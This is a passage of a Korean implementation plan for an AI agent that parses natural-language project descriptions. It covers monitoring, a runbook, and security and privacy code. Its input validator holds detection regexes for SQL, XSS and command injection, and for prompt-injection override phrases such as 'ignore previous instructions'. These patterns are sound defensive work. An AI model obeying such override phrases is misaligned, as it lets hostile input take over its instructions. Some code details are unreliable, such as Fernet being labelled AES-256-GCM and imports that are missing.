      - name: Rollback on failure
        if: failure()
        run: |
          kubectl rollout undo deployment/nl-input-agent -n t-developer-production
```

**검증 기준**:

- [ ] 자동화된 테스트 실행
- [ ] 보안 스캔 통합
- [ ] 스테이징/프로덕션 배포
- [ ] 카나리 배포 전략

#### SubTask 4.6.3: 모니터링 및 로깅 설정

**담당자**: SRE 엔지니어  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/agents/nl-input/src/monitoring/metrics.py
from prometheus_client import Counter, Histogram, Gauge, Info
from functools import wraps
import time

# 메트릭 정의
nl_requests_total = Counter(
    'nl_input_requests_total',
    'Total number of NL input requests',
    ['status', 'language', 'user_type']
)

nl_processing_time = Histogram(
    'nl_input_processing_seconds',
    'Time spent processing NL input',
    ['operation', 'model'],
    buckets=[0.1, 0.5, 1.0, 2.0, 5.0, 10.0, 30.0]
)

nl_clarification_questions = Counter(
    'nl_clarification_questions_total',
    'Total number of clarification questions generated',
    ['category', 'priority']
)

nl_token_usage = Counter(
    'nl_token_usage_total',
    'Total tokens used by NL agent',
    ['model', 'operation']
)

nl_cache_hits = Counter(
    'nl_cache_hits_total',
    'Cache hit rate for NL processing',
    ['cache_type']
)

nl_active_sessions = Gauge(
    'nl_active_sessions',
    'Number of active NL processing sessions'
)

nl_agent_info = Info(
    'nl_agent_info',
    'NL Agent version and configuration info'
)

# 메트릭 데코레이터
def track_processing_time(operation: str, model: str = "default"):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            start_time = time.time()
            try:
                result = await func(*args, **kwargs)
                nl_processing_time.labels(
                    operation=operation,
                    model=model
                ).observe(time.time() - start_time)
                return result
            except Exception as e:
                nl_processing_time.labels(
                    operation=operation,
                    model=model
                ).observe(time.time() - start_time)
                raise e
        return wrapper
    return decorator

def track_request(status_func=None):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            try:
                result = await func(*args, **kwargs)
                status = status_func(result) if status_func else "success"
                nl_requests_total.labels(
                    status=status,
                    language=kwargs.get('language', 'en'),
                    user_type=kwargs.get('user_type', 'standard')
                ).inc()
                return result
            except Exception as e:
                nl_requests_total.labels(
                    status="error",
                    language=kwargs.get('language', 'en'),
                    user_type=kwargs.get('user_type', 'standard')
                ).inc()
                raise e
        return wrapper
    return decorator

# 사용 예시
class NLMetricsCollector:
    def __init__(self):
        # 에이전트 정보 설정
        nl_agent_info.info({
            'version': '1.0.0',
            'model': 'anthropic.claude-3-sonnet-v2:0',
            'framework': 'agno'
        })

    @track_processing_time("analyze", "claude-3-sonnet")
    @track_request()
    async def analyze_with_metrics(self, description: str, **kwargs):
        # 실제 분석 로직
        result = await analyze_description(description, **kwargs)

        # 토큰 사용량 기록
        nl_token_usage.labels(
            model="claude-3-sonnet",
            operation="analyze"
        ).inc(result.token_count)

        # 명확화 질문 수 기록
        if result.clarification_questions:
            for question in result.clarification_questions:
                nl_clarification_questions.labels(
                    category=question.category,
                    priority=question.priority
                ).inc()

        return result
```

```yaml
# k8s/monitoring/nl-agent-dashboard.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: nl-agent-dashboard
  namespace: monitoring
data:
  dashboard.json: |
    {
      "dashboard": {
        "title": "NL Input Agent Monitoring",
        "panels": [
          {
            "title": "Request Rate",
            "targets": [
              {
                "expr": "rate(nl_input_requests_total[5m])",
                "legendFormat": "{{status}}"
              }
            ],
            "gridPos": { "x": 0, "y": 0, "w": 12, "h": 8 }
          },
          {
            "title": "Processing Time",
            "targets": [
              {
                "expr": "histogram_quantile(0.95, rate(nl_input_processing_seconds_bucket[5m]))",
                "legendFormat": "p95"
              },
              {
                "expr": "histogram_quantile(0.99, rate(nl_input_processing_seconds_bucket[5m]))",
                "legendFormat": "p99"
              }
            ],
            "gridPos": { "x": 12, "y": 0, "w": 12, "h": 8 }
          },
          {
            "title": "Token Usage",
            "targets": [
              {
                "expr": "rate(nl_token_usage_total[1h])",
                "legendFormat": "{{model}}"
              }
            ],
            "gridPos": { "x": 0, "y": 8, "w": 12, "h": 8 }
          },
          {
            "title": "Cache Hit Rate",
            "targets": [
              {
                "expr": "rate(nl_cache_hits_total[5m]) / rate(nl_input_requests_total[5m])",
                "legendFormat": "Hit Rate"
              }
            ],
            "gridPos": { "x": 12, "y": 8, "w": 12, "h": 8 }
          },
          {
            "title": "Active Sessions",
            "targets": [
              {
                "expr": "nl_active_sessions",
                "legendFormat": "Sessions"
              }
            ],
            "gridPos": { "x": 0, "y": 16, "w": 12, "h": 8 }
          },
          {
            "title": "Clarification Questions",
            "targets": [
              {
                "expr": "sum by (category) (rate(nl_clarification_questions_total[5m]))",
                "legendFormat": "{{category}}"
              }
            ],
            "gridPos": { "x": 12, "y": 16, "w": 12, "h": 8 }
          }
        ]
      }
    }
```

```python
# backend/agents/nl-input/src/monitoring/logging.py
import logging
import json
from pythonjsonlogger import jsonlogger
from opentelemetry import trace
from opentelemetry.trace import Status, StatusCode

# 구조화된 로깅 설정
def setup_logging():
    # JSON 포맷터 설정
    logHandler = logging.StreamHandler()
    formatter = jsonlogger.JsonFormatter(
        fmt='%(timestamp)s %(level)s %(name)s %(message)s',
        rename_fields={'timestamp': '@timestamp'}
    )
    logHandler.setFormatter(formatter)

    # 루트 로거 설정
    logger = logging.getLogger()
    logger.addHandler(logHandler)
    logger.setLevel(logging.INFO)

    return logger

# 트레이싱 설정
tracer = trace.get_tracer(__name__)

class NLAgentLogger:
    def __init__(self):
        self.logger = setup_logging()

    def log_analysis_request(self, request_id: str, description: str, metadata: dict):
        """분석 요청 로깅"""
        with tracer.start_as_current_span("nl_analysis") as span:
            span.set_attribute("request.id", request_id)
            span.set_attribute("description.length", len(description))
            span.set_attribute("user.id", metadata.get("user_id"))

            self.logger.info(
                "NL analysis request received",
                extra={
                    "request_id": request_id,
                    "description_preview": description[:100],
                    "metadata": metadata,
                    "span_id": span.get_span_context().span_id,
                    "trace_id": span.get_span_context().trace_id
                }
            )

    def log_clarification_generated(
        self,
        request_id: str,
        questions: list,
        ambiguity_score: float
    ):
        """명확화 질문 생성 로깅"""
        self.logger.info(
            "Clarification questions generated",
            extra={
                "request_id": request_id,
                "question_count": len(questions),
                "ambiguity_score": ambiguity_score,
                "question_categories": [q.get("category") for q in questions]
            }
        )

    def log_processing_error(
        self,
        request_id: str,
        error: Exception,
        context: dict
    ):
        """처리 오류 로깅"""
        span = trace.get_current_span()
        if span:
            span.set_status(Status(StatusCode.ERROR, str(error)))
            span.record_exception(error)

        self.logger.error(
            "Processing error occurred",
            extra={
                "request_id": request_id,
                "error_type": type(error).__name__,
                "error_message": str(error),
                "context": context
            },
            exc_info=True
        )

    def log_performance_metrics(
        self,
        request_id: str,
        processing_time: float,
        token_count: int,
        cache_hit: bool
    ):
        """성능 메트릭 로깅"""
        self.logger.info(
            "Performance metrics",
            extra={
                "request_id": request_id,
                "processing_time_ms": processing_time * 1000,
                "token_count": token_count,
                "cache_hit": cache_hit,
                "tokens_per_second": token_count / processing_time if processing_time > 0 else 0
            }
        )
```

**검증 기준**:

- [ ] Prometheus 메트릭 수집
- [ ] 구조화된 JSON 로깅
- [ ] 분산 트레이싱 구현
- [ ] Grafana 대시보드 구성

#### SubTask 4.6.4: 장애 대응 및 복구 절차

**담당자**: SRE 엔지니어  
**예상 소요시간**: 8시간

**작업 내용**:

````yaml
# runbooks/nl-input-agent-runbook.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: nl-input-agent-runbook
  namespace: t-developer
data:
  runbook.md: |
    # NL Input Agent Runbook

    ## Overview
    NL Input Agent는 자연어 프로젝트 설명을 분석하고 구조화된 요구사항으로 변환하는 핵심 에이전트입니다.

    ## Architecture
    - **Language**: Python 3.11
    - **Framework**: FastAPI + Agno
    - **Model**: Claude 3 Sonnet (Bedrock)
    - **Storage**: DynamoDB (context), Redis (cache)
    - **Deployment**: Kubernetes (EKS)

    ## Common Issues and Solutions

    ### 1. High Response Time
    **증상**: 
    - P95 응답 시간이 5초 초과
    - 사용자 타임아웃 증가

    **진단**:
    ```bash
    # 메트릭 확인
    kubectl top pods -n t-developer -l app=nl-input-agent

    # 로그 확인
    kubectl logs -n t-developer -l app=nl-input-agent --tail=100 | grep "processing_time"

    # 트레이스 확인
    kubectl port-forward -n monitoring svc/jaeger-query 16686:16686
    # http://localhost:16686에서 느린 트레이스 분석
    ```

    **해결방법**:
    1. 캐시 히트율 확인
    ```bash
    kubectl exec -n t-developer deploy/nl-input-agent -- redis-cli INFO stats
    ```

    2. 모델 응답 시간 확인
    ```python
    # Bedrock 지연 시간 확인
    aws cloudwatch get-metric-statistics \
      --namespace AWS/Bedrock \
      --metric-name ModelLatency \
      --dimensions Name=ModelId,Value=anthropic.claude-3-sonnet-v2:0 \
      --statistics Average \
      --start-time 2024-01-01T00:00:00Z \
      --end-time 2024-01-01T01:00:00Z \
      --period 300
    ```

    3. 스케일 아웃
    ```bash
    kubectl scale deployment nl-input-agent -n t-developer --replicas=5
    ```

    ### 2. Memory Leak
    **증상**:
    - 메모리 사용량 지속적 증가
    - OOMKilled 이벤트

    **진단**:
    ```bash
    # 메모리 사용 패턴 확인
    kubectl top pods -n t-developer -l app=nl-input-agent --use-protocol-buffers

    # 힙 덤프 생성
    kubectl exec -n t-developer deploy/nl-input-agent -- \
      python -m pyheapdump dump /tmp/heap.dump

    # 덤프 분석
    kubectl cp t-developer/nl-input-agent-xxxxx:/tmp/heap.dump ./heap.dump
    python -m pyheapdump analyze heap.dump
    ```

    **해결방법**:
    1. 즉시 재시작
    ```bash
    kubectl rollout restart deployment/nl-input-agent -n t-developer
    ```

    2. 메모리 제한 조정
    ```yaml
    resources:
      limits:
        memory: "3Gi"  # 2Gi에서 증가
    ```

    3. 코드 수정 (장기)
    - 대용량 객체 캐싱 제한
    - 세션 타임아웃 단축

    ### 3. Model API Errors
    **증상**:
    - Bedrock API 호출 실패
    - 429 (Rate Limit) 에러

    **진단**:
    ```bash
    # 에러 로그 확인
    kubectl logs -n t-developer -l app=nl-input-agent | grep -E "bedrock|rate.limit"

    # API 할당량 확인
    aws service-quotas get-service-quota \
      --service-code bedrock \
      --quota-code L-12345678
    ```

    **해결방법**:
    1. 재시도 로직 확인
    ```python
    # 지수 백오프 설정 확인
    RETRY_CONFIG = {
        "max_attempts": 5,
        "base_delay": 1.0,
        "max_delay": 60.0,
        "exponential_base": 2
    }
    ```

    2. 요청 제한 구현
    ```python
    from asyncio import Semaphore

    # 동시 요청 제한
    bedrock_semaphore = Semaphore(10)
    ```

    3. 할당량 증가 요청
    ```bash
    aws support create-case \
      --subject "Bedrock API Limit Increase Request" \
      --service-code "bedrock" \
      --severity-code "low" \
      --category-code "service-limit-increase"
    ```

    ## Monitoring Alerts

    ### Critical Alerts
    1. **NL Agent Down**
       - 조건: 가용 Pod 0개
       - 대응: 즉시 재배포

    2. **High Error Rate**
       - 조건: 5xx 에러율 > 5%
       - 대응: 로그 분석 후 핫픽스

    3. **Token Budget Exceeded**
       - 조건: 일일 토큰 한도 90% 초과
       - 대응: 요청 제한 활성화

    ### Warning Alerts
    1. **Slow Processing**
       - 조건: P95 > 3초
       - 대응: 성능 분석 및 최적화

    2. **Low Cache Hit**
       - 조건: 캐시 히트율 < 60%
       - 대응: 캐시 전략 검토

    ## Disaster Recovery

    ### Backup Strategy
    - DynamoDB: Point-in-time recovery 활성화
    - Redis: 매 시간 스냅샷
    - 설정: S3에 일일 백업

    ### Recovery Procedures
    1. **전체 장애 복구**
    ```bash
    # 1. 최신 백업 확인
    aws s3 ls s3://t-developer-backups/nl-agent/

    # 2. 새 환경에 배포
    kubectl apply -k k8s/nl-input-agent/overlays/disaster-recovery

    # 3. 데이터 복원
    python scripts/restore-dynamodb.py --table nl-contexts --backup latest

    # 4. 헬스체크
    curl -X POST https://dr.api.t-developer.com/nl-input/health
    ```

    2. **부분 장애 복구**
    ```bash
    # 장애 Pod만 재시작
    kubectl delete pod -n t-developer -l app=nl-input-agent,status=unhealthy
    ```

    ## Performance Tuning

    ### Optimization Checklist
    - [ ] 캐시 TTL 최적화 (현재: 1시간)
    - [ ] 배치 처리 크기 조정 (현재: 10)
    - [ ] 연결 풀 크기 확인 (현재: 100)
    - [ ] 가비지 컬렉션 튜닝

    ### Load Testing
    ```bash
    # Locust를 사용한 부하 테스트
    locust -f tests/load/nl_agent_load_test.py \
      --host https://api.t-developer.com \
      --users 100 \
      --spawn-rate 10 \
      --run-time 10m
    ```

    ## Contact
    - **Primary**: NL Agent Team (nl-team@company.com)
    - **Secondary**: Platform Team (platform@company.com)
    - **Escalation**: SRE Lead (sre-lead@company.com)
````

```python
# scripts/incident-response/nl-agent-diagnostics.py
#!/usr/bin/env python3
"""
NL Input Agent 진단 스크립트
"""
import asyncio
import argparse
from datetime import datetime, timedelta
import json

class NLAgentDiagnostics:
    def __init__(self, namespace="t-developer"):
        self.namespace = namespace
        self.agent_name = "nl-input-agent"

    async def run_diagnostics(self):
        """전체 진단 실행"""
        print(f"🔍 NL Input Agent Diagnostics - {datetime.now()}")
        print("=" * 60)

        # 1. 파드 상태 확인
        await self.check_pod_status()

        # 2. 메트릭 확인
        await self.check_metrics()

        # 3. 최근 에러 확인
        await self.check_recent_errors()

        # 4. 리소스 사용량 확인
        await self.check_resource_usage()

        # 5. 외부 의존성 확인
        await self.check_dependencies()

        print("\n✅ Diagnostics completed")

    async def check_pod_status(self):
        """파드 상태 확인"""
        print("\n📊 Pod Status:")
        cmd = f"kubectl get pods -n {self.namespace} -l app={self.agent_name} -o json"
        result = await self.run_command(cmd)

        pods = json.loads(result)["items"]
        for pod in pods:
            name = pod["metadata"]["name"]
            phase = pod["status"]["phase"]
            ready = all(c["ready"] for c in pod["status"].get("containerStatuses", []))
            print(f"  - {name}: {phase} (Ready: {ready})")

    async def check_metrics(self):
        """주요 메트릭 확인"""
        print("\n📈 Key Metrics (last 5m):")

        metrics = {
            "Request Rate": "rate(nl_input_requests_total[5m])",
            "Error Rate": "rate(nl_input_requests_total{status='error'}[5m])",
            "P95 Latency": "histogram_quantile(0.95, rate(nl_input_processing_seconds_bucket[5m]))",
            "Active Sessions": "nl_active_sessions"
        }

        for name, query in metrics.items():
            # 실제로는 Prometheus API 호출
            print(f"  - {name}: {query}")

    async def check_recent_errors(self):
        """최근 에러 로그 확인"""
        print("\n❌ Recent Errors (last 10m):")
        cmd = f"kubectl logs -n {self.namespace} -l app={self.agent_name} --since=10m | grep ERROR | tail -5"
        errors = await self.run_command(cmd)

        if errors:
            for line in errors.split('\n'):
                if line:
                    print(f"  - {line[:100]}...")
        else:
            print("  - No errors found")

    async def run_command(self, cmd):
        """명령 실행"""
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        return stdout.decode()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NL Agent Diagnostics")
    parser.add_argument("--namespace", default="t-developer", help="Kubernetes namespace")
    args = parser.parse_args()

    diagnostics = NLAgentDiagnostics(args.namespace)
    asyncio.run(diagnostics.run_diagnostics())
```

**검증 기준**:

- [ ] 상세한 런북 작성
- [ ] 자동 진단 스크립트
- [ ] 장애 복구 절차
- [ ] 성능 튜닝 가이드

---

# Phase 4: 9개 핵심 에이전트 구현 - Part 4 (Tasks 4.7-4.8)

## 1. NL Input Agent (자연어 입력 에이전트) - 계속

### Task 4.7: NL Agent 보안 및 컴플라이언스

#### SubTask 4.7.1: 입력 검증 및 살균 시스템

**담당자**: 보안 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_security_validator.py
from typing import Dict, List, Optional, Any
import re
import html
import hashlib
from dataclasses import dataclass
from enum import Enum

class ThreatLevel(Enum):
    NONE = "none"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class ValidationResult:
    is_valid: bool
    threat_level: ThreatLevel
    issues: List[str]
    sanitized_input: str
    metadata: Dict[str, Any]

class NLSecurityValidator:
    """NL 입력에 대한 보안 검증 및 살균"""

    def __init__(self):
        self.injection_patterns = self._load_injection_patterns()
        self.sensitive_data_patterns = self._load_sensitive_patterns()
        self.rate_limiter = RateLimiter()
        self.threat_detector = ThreatDetector()

    def _load_injection_patterns(self) -> Dict[str, List[re.Pattern]]:
        """인젝션 공격 패턴 로드"""
        return {
            'sql_injection': [
                re.compile(r"(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|CREATE)\b)", re.I),
                re.compile(r"(--|#|/\*|\*/)", re.I),
                re.compile(r"(\bOR\b\s*\d+\s*=\s*\d+)", re.I),
                re.compile(r"(\bAND\b\s*\d+\s*=\s*\d+)", re.I)
            ],
            'prompt_injection': [
                re.compile(r"(ignore\s+previous\s+instructions)", re.I),
                re.compile(r"(forget\s+everything)", re.I),
                re.compile(r"(system\s*:\s*|assistant\s*:)", re.I),
                re.compile(r"(\[\[.*?\]\]|\{\{.*?\}\})", re.I),
                re.compile(r"(bypass|override|disable)\s+(security|safety|filter)", re.I)
            ],
            'xss_patterns': [
                re.compile(r"<script[^>]*>.*?</script>", re.I | re.S),
                re.compile(r"javascript:", re.I),
                re.compile(r"on\w+\s*=", re.I),
                re.compile(r"<iframe[^>]*>", re.I)
            ],
            'command_injection': [
                re.compile(r"[;&|`$]"),
                re.compile(r"\$\([^)]+\)"),
                re.compile(r"`[^`]+`")
            ]
        }

    def _load_sensitive_patterns(self) -> Dict[str, re.Pattern]:
        """민감 데이터 패턴 로드"""
        return {
            'credit_card': re.compile(r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'),
            'ssn': re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
            'email': re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
            'phone': re.compile(r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'),
            'api_key': re.compile(r'\b(api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9-_]+)["\']?\b', re.I),
            'password': re.compile(r'\b(password|passwd|pwd)\s*[:=]\s*["\']?([^\s"\']+)["\']?\b', re.I),
            'aws_key': re.compile(r'AKIA[0-9A-Z]{16}'),
            'private_key': re.compile(r'-----BEGIN (RSA |EC )?PRIVATE KEY-----')
        }

    async def validate_input(
        self,
        input_text: str,
        user_id: str,
        context: Optional[Dict[str, Any]] = None
    ) -> ValidationResult:
        """입력 검증 수행"""

        issues = []
        threat_level = ThreatLevel.NONE

        # 1. 길이 검증
        if len(input_text) > 10000:
            issues.append("Input exceeds maximum length (10000 characters)")
            threat_level = ThreatLevel.MEDIUM

        if len(input_text) < 10:
            issues.append("Input too short (minimum 10 characters)")
            return ValidationResult(
                is_valid=False,
                threat_level=ThreatLevel.LOW,
                issues=issues,
                sanitized_input="",
                metadata={}
            )

        # 2. 인젝션 공격 검사
        injection_results = await self._check_injection_attacks(input_text)
        if injection_results['detected']:
            issues.extend(injection_results['issues'])
            threat_level = max(threat_level, injection_results['threat_level'])

        # 3. 민감 데이터 검사
        sensitive_results = await self._check_sensitive_data(input_text)
        if sensitive_results['detected']:
            issues.extend(sensitive_results['issues'])
            threat_level = max(threat_level, ThreatLevel.HIGH)

        # 4. Rate limiting 검사
        if not await self.rate_limiter.check_rate_limit(user_id):
            issues.append("Rate limit exceeded")
            threat_level = ThreatLevel.HIGH

        # 5. 입력 살균
        sanitized_input = await self._sanitize_input(input_text)

        # 6. 악의적 패턴 검사
        malicious_score = await self.threat_detector.analyze_intent(sanitized_input)
        if malicious_score > 0.7:
            issues.append("Potentially malicious intent detected")
            threat_level = max(threat_level, ThreatLevel.HIGH)

        # 7. 로깅
        await self._log_validation_result(
            user_id,
            input_text,
            sanitized_input,
            issues,
            threat_level
        )

        return ValidationResult(
            is_valid=len(issues) == 0 or threat_level.value in ["none", "low"],
            threat_level=threat_level,
            issues=issues,
            sanitized_input=sanitized_input,
            metadata={
                "original_length": len(input_text),
                "sanitized_length": len(sanitized_input),
                "malicious_score": malicious_score
            }
        )

    async def _check_injection_attacks(
        self,
        input_text: str
    ) -> Dict[str, Any]:
        """인젝션 공격 패턴 검사"""

        detected = False
        issues = []
        threat_level = ThreatLevel.NONE

        for attack_type, patterns in self.injection_patterns.items():
            for pattern in patterns:
                if pattern.search(input_text):
                    detected = True
                    issues.append(f"Potential {attack_type} detected")

                    if attack_type in ['sql_injection', 'command_injection']:
                        threat_level = ThreatLevel.CRITICAL
                    elif attack_type == 'prompt_injection':
                        threat_level = max(threat_level, ThreatLevel.HIGH)
                    else:
                        threat_level = max(threat_level, ThreatLevel.MEDIUM)

                    break

        return {
            'detected': detected,
            'issues': issues,
            'threat_level': threat_level
        }

    async def _check_sensitive_data(
        self,
        input_text: str
    ) -> Dict[str, Any]:
        """민감 데이터 검사"""

        detected = False
        issues = []
        found_types = []

        for data_type, pattern in self.sensitive_data_patterns.items():
            matches = pattern.findall(input_text)
            if matches:
                detected = True
                found_types.append(data_type)
                issues.append(f"Sensitive data detected: {data_type}")

        return {
            'detected': detected,
            'issues': issues,
            'found_types': found_types
        }

    async def _sanitize_input(self, input_text: str) -> str:
        """입력 살균"""

        # 1. HTML 엔티티 이스케이프
        sanitized = html.escape(input_text)

        # 2. 특수 문자 처리
        # 안전한 문자만 허용
        safe_chars = re.compile(r'[^a-zA-Z0-9\s\-_.,!?;:\'"\(\)\[\]{}/\\@#$%^&*+=~`|<>가-힣ㄱ-ㅎㅏ-ㅣ]')
        sanitized = safe_chars.sub('', sanitized)

        # 3. 연속된 공백 제거
        sanitized = re.sub(r'\s+', ' ', sanitized)

        # 4. 앞뒤 공백 제거
        sanitized = sanitized.strip()

        # 5. 최대 길이 제한
        if len(sanitized) > 5000:
            sanitized = sanitized[:5000]

        return sanitized

    async def _log_validation_result(
        self,
        user_id: str,
        original_input: str,
        sanitized_input: str,
        issues: List[str],
        threat_level: ThreatLevel
    ):
        """검증 결과 로깅"""

        # 민감 데이터 마스킹
        masked_input = self._mask_sensitive_data(original_input)

        log_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "user_id": hashlib.sha256(user_id.encode()).hexdigest(),
            "input_hash": hashlib.sha256(original_input.encode()).hexdigest(),
            "input_preview": masked_input[:100],
            "threat_level": threat_level.value,
            "issues": issues,
            "action": "validated"
        }

        # 보안 이벤트 로깅
        if threat_level.value in ["high", "critical"]:
            await self._send_security_alert(log_entry)

        # 감사 로그 저장
        await self._save_audit_log(log_entry)
```

**검증 기준**:

- [ ] 다양한 인젝션 공격 탐지
- [ ] 민감 데이터 자동 마스킹
- [ ] 위협 수준 평가
- [ ] 감사 로그 생성

#### SubTask 4.7.2: 데이터 암호화 및 프라이버시

**담당자**: 보안 아키텍트  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_privacy_manager.py
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import os
from typing import Dict, Optional, Any

class NLPrivacyManager:
    """NL 데이터 암호화 및 프라이버시 관리"""

    def __init__(self):
        self.encryption_key = self._derive_encryption_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.pii_detector = PIIDetector()
        self.anonymizer = DataAnonymizer()

    def _derive_encryption_key(self) -> bytes:
        """마스터 키에서 암호화 키 유도"""
        master_key = os.environ.get("MASTER_ENCRYPTION_KEY", "").encode()
        salt = os.environ.get("ENCRYPTION_SALT", "").encode()

        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(master_key))
        return key

    async def encrypt_user_data(
        self,
        data: Dict[str, Any],
        encryption_level: str = "standard"
    ) -> Dict[str, Any]:
        """사용자 데이터 암호화"""

        encrypted_data = {}

        for key, value in data.items():
            if self._should_encrypt_field(key, encryption_level):
                if isinstance(value, str):
                    encrypted_value = self.cipher_suite.encrypt(value.encode())
                    encrypted_data[key] = {
                        "encrypted": True,
                        "value": base64.b64encode(encrypted_value).decode(),
                        "algorithm": "AES-256-GCM"
                    }
                else:
                    # 복잡한 데이터 타입은 JSON으로 직렬화 후 암호화
                    import json
                    serialized = json.dumps(value)
                    encrypted_value = self.cipher_suite.encrypt(serialized.encode())
                    encrypted_data[key] = {
                        "encrypted": True,
                        "value": base64.b64encode(encrypted_value).decode(),
                        "type": type(value).__name__,
                        "algorithm": "AES-256-GCM"
                    }
            else:
                encrypted_data[key] = value

        return encrypted_data

    async def decrypt_user_data(
        self,
        encrypted_data: Dict[str, Any]
    ) -> Dict[str, Any]:
        """사용자 데이터 복호화"""

        decrypted_data = {}

        for key, value in encrypted_data.items():
            if isinstance(value, dict) and value.get("encrypted"):
                try:
                    encrypted_bytes = base64.b64decode(value["value"])
                    decrypted_bytes = self.cipher_suite.decrypt(encrypted_bytes)

                    if value.get("type"):
                        # 복잡한 데이터 타입 복원
                        import json
                        decrypted_data[key] = json.loads(decrypted_bytes.decode())
                    else:
                        decrypted_data[key] = decrypted_bytes.decode()
                except Exception as e:
                    # 복호화 실패 시 로깅하고 None 반환
                    logger.error(f"Failed to decrypt field {key}: {str(e)}")
                    decrypted_data[key] = None
            else:
                decrypted_data[key] = value

        return decrypted_data

    async def anonymize_for_analytics(
        self,
        data: Dict[str, Any],
        anonymization_level: str = "standard"
    ) -> Dict[str, Any]:
        """분석용 데이터 익명화"""

        # PII 감지
        pii_fields = await self.pii_detector.detect_pii(data)

        # 익명화 수행
        anonymized_data = {}

        for key, value in data.items():
            if key in pii_fields:
                if anonymization_level == "strict":
                    # 완전 제거
                    continue
                elif anonymization_level == "standard":
                    # 익명화
                    anonymized_data[key] = await self.anonymizer.anonymize(
                        value,
                        pii_fields[key]["type"]
                    )
                else:
                    # 부분 마스킹
                    anonymized_data[key] = self._partial_mask(value)
            else:
                anonymized_data[key] = value

        # 익명화 메타데이터 추가
        anonymized_data["_anonymization"] = {
            "level": anonymization_level,
            "timestamp": datetime.utcnow().isoformat(),
            "removed_fields": list(set(pii_fields.keys()) - set(anonymized_data.keys()))
        }

        return anonymized_data

    def _should_encrypt_field(self, field_name: str, level: str) -> bool:
        """필드 암호화 필요 여부 판단"""

        always_encrypt = [
            "description", "user_input", "requirements",
            "clarification_answers", "feedback"
        ]

        sensitive_fields = [
            "email", "phone", "address", "name",
            "company", "project_details"
        ]

        if level == "strict":
            return True
        elif level == "standard":
            return field_name in always_encrypt or field_name in sensitive_fields
        else:
            return field_name in always_encrypt

    def _partial_mask(self, value: str) -> str:
        """부분 마스킹"""
        if len(value) <= 4:
            return "*" * len(value)

        visible_chars = max(2, len(value) // 4)
        return value[:visible_chars] + "*" * (len(value) - visible_chars * 2) + value[-visible_chars:]

    async def generate_privacy_report(
        self,
        user_id: str,
        start_date: datetime,
        end_date: datetime
    ) -> Dict[str, Any]:
        """프라이버시 보고서 생성"""

        report = {
            "user_id": hashlib.sha256(user_id.encode()).hexdigest(),
            "period": {
                "start": start_date.isoformat(),
                "end": end_date.isoformat()
            },
            "data_collected": await self._get_collected_data_summary(user_id, start_date, end_date),
            "data_sharing": await self._get_data_sharing_summary(user_id, start_date, end_date),
            "data_retention": await self._get_retention_status(user_id),
            "privacy_settings": await self._get_privacy_settings(user_id)
        }

        return report

class PIIDetector:
    """개인식별정보 감지기"""

    def __init__(self):
        self.patterns = {
            "email": re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'),
            "phone": re.compile(r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'),
            "ssn": re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
            "credit_card": re.compile(r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'),
            "ip_address": re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'),
            "name": None  # NER 모델 사용
        }

    async def detect_pii(self, data: Dict[str, Any]) -> Dict[str, Dict[str, Any]]:
        """PII 감지"""
        pii_fields = {}

        for key, value in data.items():
            if isinstance(value, str):
                for pii_type, pattern in self.patterns.items():
                    if pattern and pattern.search(value):
                        pii_fields[key] = {
                            "type": pii_type,
                            "confidence": 0.95
                        }
                        break

                # NER을 사용한 이름 감지
                if key not in pii_fields and await self._is_name(value):
                    pii_fields[key] = {
                        "type": "name",
                        "confidence": 0.8
                    }

        return pii_fields
```

**검증 기준**:

- [ ] AES-256 암호화 구현
- [ ] PII 자동 감지
- [ ] 데이터 익명화 기능
- [ ] 프라이버시 보고서 생성

#### SubTask 4.7.3: 접근 제어 및 인증

**담당자**: 보안 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```typescript
// backend/src/agents/implementations/nl-access-control.ts
import jwt from "jsonwebtoken";
import { Request, Response, NextFunction } from "express";

interface TokenPayload {
  userId: string;
  role: string;
  permissions: string[];
  sessionId: string;
  exp: number;
}

interface AccessPolicy {
  resource: string;
  actions: string[];
  conditions?: Record<string, any>;
}

class NLAccessControl {
  private jwtSecret: string;
  private policies: Map<string, AccessPolicy[]>;
  private roleHierarchy: Map<string, string[]>;

  constructor() {
    this.jwtSecret = process.env.JWT_SECRET!;
    this.policies = new Map();
    this.roleHierarchy = new Map();
    this.initializePolicies();
  }

  private initializePolicies(): void {
    // 역할 계층 정의
    this.roleHierarchy.set("admin", ["power_user", "user", "guest"]);
    this.roleHierarchy.set("power_user", ["user", "guest"]);
    this.roleHierarchy.set("user", ["guest"]);
    this.roleHierarchy.set("guest", []);

    // 역할별 정책 정의
    this.policies.set("admin", [
      {
        resource: "nl-input/*",
